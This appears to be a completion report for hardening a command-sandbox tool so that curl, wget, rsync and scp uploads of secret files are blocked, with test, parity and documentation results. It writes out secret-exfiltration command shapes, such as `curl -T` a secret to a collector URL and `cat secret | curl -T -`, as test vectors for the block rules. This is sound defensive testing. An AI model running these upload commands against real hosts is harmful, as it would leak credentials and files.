tier2.summary:
COMPLETE
  ✓ curl file-upload MODIFY verdict must not deliver a local secret to a local collector; add a regression proving the collector receives no secret, preserve legitimate upload controls or document deliberate changes, update docs and YAML parity, full suite and guard green: DEFECT FIXED (independent repro, /tmp/df20_probe.py): real standalone CLI vs loopback http.server collector with shipped mirror pinned — `terminal-jail curl -s -T <secret> http://127.0.0.1:<port>/collect` -> rc=126, stderr 'COMMAND BLOCKED — builtin-net-curl-upload', collector requests=[], SECRET DELIVERED: False (pre-fix this was MODIFY/builtin-net-curl-upload with the payload received). REGRESSION: plugin/test_egress_no_delivery.py (new, 279 lines) has 3 no-delivery tests (curl -T, curl --data-binary @file, wget --post-file) asserting rc==126 + rule id + collector.requests==[] + marker absent from bodies, plus 2 positive controls (plain download, inline-body POST) that must still deliver so 'nothing received' cannot pass vacuously; `.venv/bin/python -m pytest -q -p no:cacheprovider plugin/test_egress_no_delivery.py` -> 6 passed in 3.69s. RED PROOF reproduced: reverting blocklist.py/sandbox.py/00-builtins.yaml to pre-fix c454ccf makes the same file report '4 failed, 2 passed' with `AssertionError: engine verdict for the collector vector is 'modify' (rule='auto-pytest')`; files restored byte-identical to HEAD (git diff HEAD empty). CONTROLS PRESERVED: /tmp/df20_controls.py — 13 pinned ALLOW controls (plain curl download, wget -O, inline -d/--data-binary, inline -F field, --form-string, wget --post-data, scoped rsync/scp, local copy, git push, ssh, curl -fsSL) all action=allow; 15 upload/exfil shapes (clustered -sT, attached -T/path, --upload-file=, -sF, quoted-& URL, rsync -a / host:, scp -r /, `cat secret | curl -T -`) all action=block; failures: 0. YAML PARITY: 4 ids moved to blocklist.py as priority-1000 block rules and removed from sandbox.py (13->9); plugin/terminal_jail/rules/00-builtins.yaml:398/414/425/442 carry the same ids at action: block with byte-identical patterns; `scripts/yaml-mirror-parity-probe.py` -> 'ALL PROBES PASS', '[totals] block=35/35 sandbox=9/9 allow=10/10 total=54/54 -> OK', exit 0. DOCS: README §1c 'Data-Out Boundary' (block table, pinned controls, upgrade note), specs/interruptor.md §4.5/§4.6, CHANGELOG.md, docs/quickstart.md (54 rules), skills/terminal-jail-usage/SKILL.md 1.7.0, docs/dogfood/diagnostics.md DF-20 row RESOLVED. FULL SUITE: `.venv/bin/python -m pytest -q -p no:cacheprovider` -> 821 passed, 5 skipped in 20.19s. GUARD: `gitreins guard --full` -> 'Tier 1 Guards: PASS (test mode: full, whole tree) — secrets clean, lint ok, tests (full), static_analysis'. LSP diagnostics: 0.
The egress MODIFY uploads were converted to real BLOCK containment (verified end-to-end: rc=126, collector receives zero requests, no secret delivered), with a regression that fails on the pre-fix engine, all legitimate upload controls preserved, docs/YAML parity updated, and the full suite (821 passed) plus guard (4/4 PASS) green.
